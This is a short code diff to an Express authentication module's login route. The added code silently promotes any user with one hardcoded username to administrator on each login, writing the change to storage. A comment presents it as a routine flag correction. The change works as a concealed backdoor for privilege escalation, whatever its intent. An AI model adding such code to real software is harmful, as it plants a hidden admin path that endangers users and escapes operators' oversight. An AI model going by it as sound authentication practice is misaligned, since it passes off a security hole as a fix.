@@ -159,8 +159,14 @@ export function setupAuth(app: Express) {
     }
   });
 
-  app.post("/api/auth/login", authLimiter, passport.authenticate("local"), (req, res) => {
-    const { password, ...userWithoutPassword } = req.user as User;
+  app.post("/api/auth/login", authLimiter, passport.authenticate("local"), async (req, res) => {
+    const user = req.user as User;
+    // Ensure admin flag is always correct regardless of when account was created
+    if (user.username === 'dathwal@qrmingle#2025' && !user.isAdmin) {
+      await storage.updateUserAdminStatus(user.id, true);
+      user.isAdmin = true;
+    }
+    const { password, ...userWithoutPassword } = user;
     res.status(200).json(userWithoutPassword);
   });
 
